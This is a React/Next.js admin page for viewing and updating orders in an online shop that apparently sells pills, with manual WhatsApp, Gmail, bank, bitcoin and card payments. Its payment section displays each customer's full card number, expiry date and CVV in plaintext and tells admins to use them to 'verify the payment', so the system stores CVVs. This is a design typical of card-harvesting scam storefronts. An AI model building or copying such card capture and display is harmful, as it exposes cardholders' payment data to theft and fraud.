'use client'

import { useState, useEffect } from 'react'
import { useParams, useRouter } from 'next/navigation'
import Link from 'next/link'
import API from '../../../../lib/api'

const STATUS_FLOW = ['pending', 'confirmed', 'processing', 'shipped', 'delivered', 'cancelled']

const STATUS_COLORS = {
  pending: '#f59e0b', confirmed: '#3b82f6', processing: '#8b5cf6',
  shipped: '#0f766e', delivered: '#059669', cancelled: '#ef4444',
}

function formatDate(d) {
  if (!d) return '-'
  return new Date(d).toLocaleString()
}

export default function AdminOrderDetail() {
  const { id } = useParams()
  const router = useRouter()
  const [order, setOrder] = useState(null)
  const [loading, setLoading] = useState(true)
  const [updating, setUpdating] = useState(false)
  const [seo, setSeo] = useState(null)

  useEffect(() => {
    API.get(`/orders/${id}`)
      .then(({ data }) => setOrder(data.order || data))
      .catch(() => setOrder(null))
      .finally(() => setLoading(false))
    API.get('/seo')
      .then(({ data }) => setSeo(data.seo || null))
      .catch(() => {})
  }, [id])

  const handleStatusUpdate = async (newStatus) => {
    setUpdating(true)
    try {
      await API.put(`/orders/${id}/status`, { orderStatus: newStatus })
      setOrder(prev => ({ ...prev, orderStatus: newStatus }))
    } catch (err) {
      alert(err.response?.data?.message || 'Failed to update status')
    } finally {
      setUpdating(false)
    }
  }

  if (loading) return <div style={{ padding: 40, textAlign: 'center' }}>Loading order...</div>
  if (!order) return <div style={{ padding: 40, textAlign: 'center' }}><h3>Order not found</h3><Link href="/admin/orders">Back to Orders</Link></div>

  const sectionStyle = { background: '#fff', borderRadius: 12, padding: 24, marginBottom: 20, boxShadow: '0 1px 3px rgba(0,0,0,0.1)' }
  const labelStyle = { fontSize: 12, color: '#6b7280', fontWeight: 500, textTransform: 'uppercase', letterSpacing: 0.5 }
  const valueStyle = { fontSize: 14, color: '#111827', fontWeight: 600, marginTop: 2 }

  const isCancelled = order.orderStatus === 'cancelled'
  const isDelivered = order.orderStatus === 'delivered'

  const statusActions = []
  if (!isCancelled && !isDelivered) {
    const currentIdx = STATUS_FLOW.indexOf(order.orderStatus)
    if (currentIdx < STATUS_FLOW.indexOf('delivered') - 1) {
      statusActions.push({ status: STATUS_FLOW[currentIdx + 1], label: `Mark as ${STATUS_FLOW[currentIdx + 1]}`, color: '#6366f1' })
    }
    if (currentIdx < STATUS_FLOW.indexOf('delivered') && order.orderStatus !== 'delivered') {
      statusActions.push({ status: 'delivered', label: 'Mark as Delivered & Paid', color: '#059669' })
    }
    if (order.orderStatus !== 'cancelled') {
      statusActions.push({ status: 'cancelled', label: 'Cancel Order', color: '#ef4444' })
    }
  }

  const bitcoinAddress = seo?.bitcoinAddress || ''

  return (
    <div>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 24 }}>
        <div>
          <h2 style={{ margin: 0 }}>Order #{order._id?.slice(-8).toUpperCase()}</h2>
          <p style={{ fontSize: 13, color: '#6b7280', margin: '4px 0 0' }}>Placed on {formatDate(order.createdAt)}</p>
        </div>
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <span style={{
            padding: '4px 12px', borderRadius: 20, fontSize: 13, fontWeight: 600,
            background: `${STATUS_COLORS[order.orderStatus] || '#6b7280'}15`,
            color: STATUS_COLORS[order.orderStatus] || '#6b7280',
            border: `1px solid ${STATUS_COLORS[order.orderStatus] || '#6b7280'}30`,
          }}>
            {order.orderStatus?.toUpperCase()}
          </span>
          {!isCancelled && !isDelivered && (
            <span style={{ fontSize: 12, color: isDelivered ? '#059669' : '#f59e0b', fontWeight: 500 }}>
              <i className={`fa-solid ${order.isPaid ? 'fa-circle-check' : 'fa-circle'}`} style={{ marginRight: 4 }} />
              {order.isPaid ? 'Paid' : 'Unpaid'}
            </span>
          )}
        </div>
      </div>

      {/* Confirm Order — prominent for pending orders */}
      {order.orderStatus === 'pending' && (
        <div style={{ ...sectionStyle, borderLeft: '4px solid #059669', background: '#f0fdf4' }}>
          <h3 style={{ fontSize: 16, fontWeight: 700, marginBottom: 8, color: '#065f46' }}>
            <i className="fa-solid fa-clipboard-check" style={{ marginRight: 8 }} />
            Order Awaiting Confirmation
          </h3>
          <p style={{ fontSize: 13, color: '#6b7280', marginBottom: 12 }}>
            Review the payment details below before confirming this order.
          </p>
          <button onClick={() => handleStatusUpdate('confirmed')} disabled={updating}
            style={{
              padding: '12px 32px', border: 'none', borderRadius: 10,
              background: updating ? '#9ca3af' : '#059669', color: '#fff',
              cursor: updating ? 'not-allowed' : 'pointer', fontWeight: 700, fontSize: 15,
              boxShadow: '0 4px 14px rgba(5,150,105,0.35)',
              transition: 'all 0.15s',
            }}>
            {updating ? <><i className="fa-solid fa-spinner fa-spin" /> Updating...</> : <><i className="fa-solid fa-check-circle" /> Confirm Order / Approve Payment</>}
          </button>
        </div>
      )}

      {/* Status Actions */}
      {statusActions.length > 0 && order.orderStatus !== 'pending' && (
        <div style={sectionStyle}>
          <h3 style={{ fontSize: 15, fontWeight: 700, marginBottom: 12, color: '#111827' }}>Update Status</h3>
          <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
            {statusActions.map(action => (
              <button key={action.status} onClick={() => handleStatusUpdate(action.status)} disabled={updating}
                style={{
                  padding: '8px 20px', border: 'none', borderRadius: 8, background: action.color,
                  color: '#fff', cursor: 'pointer', fontWeight: 600, fontSize: 13, opacity: updating ? 0.6 : 1,
                }}>
                {action.label}
              </button>
            ))}
          </div>
        </div>
      )}

      {/* Customer Info */}
      <div style={sectionStyle}>
        <h3 style={{ fontSize: 15, fontWeight: 700, marginBottom: 16, color: '#111827' }}>Customer Information</h3>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 20 }}>
          <div><p style={labelStyle}>Name</p><p style={valueStyle}>{order.shippingAddress?.firstName || order.user?.name || 'N/A'} {order.shippingAddress?.lastName || ''}</p></div>
          <div><p style={labelStyle}>Email</p><p style={valueStyle}>{order.shippingAddress?.email || order.user?.email || 'N/A'}</p></div>
          <div><p style={labelStyle}>Phone</p><p style={valueStyle}>{order.shippingAddress?.phone || order.phone || 'N/A'}</p></div>
          <div style={{ gridColumn: '1/-1' }}><p style={labelStyle}>Shipping Address</p><p style={valueStyle}>
            {typeof order.shippingAddress === 'string' ? order.shippingAddress : (
              [order.shippingAddress?.address, order.shippingAddress?.city, order.shippingAddress?.state, order.shippingAddress?.zip, order.shippingAddress?.country].filter(Boolean).join(', ') || 'N/A'
            )}
          </p></div>
          {order.notes && <div style={{ gridColumn: '1/-1' }}><p style={labelStyle}>Order Notes</p><p style={valueStyle}>{order.notes}</p></div>}
        </div>
      </div>

      {/* Payment Info */}
      <div style={{ ...sectionStyle, borderLeft: `4px solid ${order.isPaid ? '#059669' : '#f59e0b'}` }}>
        <h3 style={{ fontSize: 15, fontWeight: 700, marginBottom: 16, color: '#111827' }}>
          <i className="fa-solid fa-credit-card" style={{ marginRight: 8 }} />
          Payment Details
        </h3>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 20 }}>
          <div>
            <p style={labelStyle}>Payment Method</p>
            <p style={valueStyle}>
              <span style={{
                display: 'inline-block', padding: '2px 10px', borderRadius: 12,
                background: order.paymentMethod === 'whatsapp' ? '#dbeafe' : order.paymentMethod === 'bitcoin' ? '#fef3c7' : order.paymentMethod === 'card' ? '#f3f4f6' : order.paymentMethod === 'bank' ? '#e0e7ff' : order.paymentMethod === 'gmail' ? '#fce7f3' : '#f3f4f6',
                color: order.paymentMethod === 'whatsapp' ? '#1d4ed8' : order.paymentMethod === 'bitcoin' ? '#92400e' : order.paymentMethod === 'card' ? '#374151' : order.paymentMethod === 'bank' ? '#3730a3' : order.paymentMethod === 'gmail' ? '#9d174d' : '#374151',
                fontSize: 12, fontWeight: 600, textTransform: 'capitalize',
              }}>
                {order.paymentMethod || 'whatsapp'}
              </span>
            </p>
          </div>
          <div><p style={labelStyle}>Sub Payment Method</p><p style={valueStyle}>{order.subPaymentMethod || '-'}</p></div>
          <div><p style={labelStyle}>Payment Status</p>
            <p style={{ ...valueStyle, color: order.isPaid ? '#059669' : '#f59e0b' }}>
              {order.isPaid ? 'Paid' : 'Unpaid'}
              {order.paidAt && <span style={{ fontWeight: 400, fontSize: 12, color: '#6b7280', marginLeft: 8 }}>on {formatDate(order.paidAt)}</span>}
            </p>
          </div>
        </div>

        {/* Card Details - Full */}
        {order.cardDetails?.cardNumber && (
          <div style={{ marginTop: 16, padding: 16, background: '#fefce8', borderRadius: 8, border: '1px solid #fde68a' }}>
            <h4 style={{ fontSize: 13, fontWeight: 700, color: '#92400e', marginBottom: 12 }}>
              <i className="fa-solid fa-credit-card" style={{ marginRight: 6 }} />
              Card Details Received from Customer
            </h4>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr 1fr', gap: 12 }}>
              <div>
                <p style={labelStyle}>Name on Card</p>
                <p style={{ ...valueStyle, color: '#1e293b' }}>{order.cardDetails.nameOnCard}</p>
              </div>
              <div>
                <p style={labelStyle}>Card Number</p>
                <p style={{ ...valueStyle, fontFamily: 'monospace', fontSize: 15, letterSpacing: 1, color: '#1e293b' }}>
                  {order.cardDetails.cardNumber.replace(/(\d{4})/g, '$1 ').trim()}
                </p>
              </div>
              <div>
                <p style={labelStyle}>Expiry</p>
                <p style={valueStyle}>{order.cardDetails.expiryDate}</p>
              </div>
              <div>
                <p style={labelStyle}>CVV</p>
                <p style={{ ...valueStyle, fontFamily: 'monospace', fontSize: 16, letterSpacing: 2, color: '#991b1b' }}>
                  {order.cardDetails.cvv}
                </p>
              </div>
            </div>
            <p style={{ fontSize: 11, color: '#92400e', marginTop: 8 }}>
              <i className="fa-solid fa-eye" style={{ marginRight: 4 }} />
              These details are only visible to admins. Use them to verify the payment before confirming the order.
            </p>
          </div>
        )}

        {/* Bitcoin Address from SEO */}
        {bitcoinAddress && (
          <div style={{ marginTop: 12, padding: 16, background: '#fffbeb', borderRadius: 8, border: '1px solid #fde68a' }}>
            <h4 style={{ fontSize: 13, fontWeight: 700, color: '#92400e', marginBottom: 8 }}>
              <i className="fa-brands fa-bitcoin" style={{ marginRight: 6 }} />
              Bitcoin Payment Address (Global)
            </h4>
            <p style={{ fontSize: 14, fontFamily: 'monospace', color: '#111827', wordBreak: 'break-all' }}>{bitcoinAddress}</p>
            <p style={{ fontSize: 12, color: '#6b7280', marginTop: 4 }}>Configured in SEO Settings. Inform customer to send payment to this address.</p>
          </div>
        )}
      </div>

      {/* Order Items */}
      <div style={sectionStyle}>
        <h3 style={{ fontSize: 15, fontWeight: 700, marginBottom: 16, color: '#111827' }}>Order Items</h3>
        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 14 }}>
          <thead><tr style={{ background: '#f9fafb' }}>
            <th style={thStyle}>Product</th><th style={thStyle}>Price</th><th style={thStyle}>Qty</th><th style={thStyle}>Pills</th><th style={{ ...thStyle, textAlign: 'right' }}>Total</th>
          </tr></thead>
          <tbody>
            {(order.orderItems || []).map((item, i) => (
              <tr key={i}>
                <td style={tdStyle}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                    {item.image && <img src={item.image.startsWith('/uploads') ? `${process.env.NEXT_PUBLIC_API_URL}${item.image}` : item.image} alt={item.name} style={{ width: 44, height: 44, borderRadius: 6, objectFit: 'cover' }} />}
                    <div>
                      <p style={{ margin: 0, fontWeight: 600 }}>{item.name}</p>
                      <Link href={`/admin/products/edit/${item.product}`} style={{ fontSize: 12, color: '#6366f1' }}>View Product</Link>
                    </div>
                  </div>
                </td>
                <td style={tdStyle}>${item.price?.toFixed(2)}</td>
                <td style={tdStyle}>{item.qty}</td>
                <td style={tdStyle}>{item.pills ? `${item.pills} pills` : '-'}</td>
                <td style={{ ...tdStyle, textAlign: 'right', fontWeight: 600 }}>${((item.price || 0) * (item.qty || 1)).toFixed(2)}</td>
              </tr>
            ))}
          </tbody>
          <tfoot>
            <tr><td colSpan={4} style={{ textAlign: 'right', padding: '12px 12px', fontWeight: 700, fontSize: 14, borderTop: '2px solid #e5e7eb' }}>Total</td>
              <td style={{ padding: '12px 12px', textAlign: 'right', fontWeight: 700, fontSize: 16, color: '#059669', borderTop: '2px solid #e5e7eb' }}>${(order.totalPrice || order.total || 0).toFixed(2)}</td>
            </tr>
          </tfoot>
        </table>
      </div>

      {/* Timeline */}
      <div style={sectionStyle}>
        <h3 style={{ fontSize: 15, fontWeight: 700, marginBottom: 16, color: '#111827' }}>Order Timeline</h3>
        <div style={{ display: 'flex', gap: 0, alignItems: 'flex-start' }}>
          {STATUS_FLOW.filter(s => s !== 'cancelled').map((status, idx) => {
            const currentIdx = STATUS_FLOW.indexOf(order.orderStatus)
            const statusIdx = STATUS_FLOW.indexOf(status)
            const isPast = statusIdx <= currentIdx && order.orderStatus !== 'cancelled'
            const isCurrent = status === order.orderStatus
            return (
              <div key={status} style={{ flex: 1, textAlign: 'center', position: 'relative' }}>
                <div style={{
                  width: 32, height: 32, borderRadius: '50%', margin: '0 auto 6px',
                  background: isPast ? STATUS_COLORS[status] : '#e5e7eb',
                  color: isPast ? '#fff' : '#9ca3af',
                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                  fontSize: 12, fontWeight: 700, border: isCurrent ? `3px solid ${STATUS_COLORS[status]}` : 'none',
                  boxShadow: isCurrent ? `0 0 0 3px ${STATUS_COLORS[status]}20` : 'none',
                }}>
                  {isPast ? <i className="fa-solid fa-check" /> : idx + 1}
                </div>
                <p style={{ fontSize: 11, color: isPast ? STATUS_COLORS[status] : '#9ca3af', fontWeight: isCurrent ? 700 : 500, margin: 0, textTransform: 'capitalize' }}>{status}</p>
              </div>
            )
          })}
        </div>
        {order.orderStatus === 'cancelled' && (
          <div style={{ marginTop: 16, padding: 12, background: '#fef2f2', borderRadius: 8, color: '#ef4444', fontSize: 14, fontWeight: 600, textAlign: 'center' }}>
            <i className="fa-solid fa-ban" style={{ marginRight: 8 }} />This order has been cancelled.
          </div>
        )}
      </div>
    </div>
  )
}

const thStyle = { padding: '10px 12px', textAlign: 'left', fontWeight: 600, borderBottom: '2px solid #e5e7eb', fontSize: 13, color: '#6b7280' }
const tdStyle = { padding: '10px 12px', borderBottom: '1px solid #f3f4f6', verticalAlign: 'middle' }
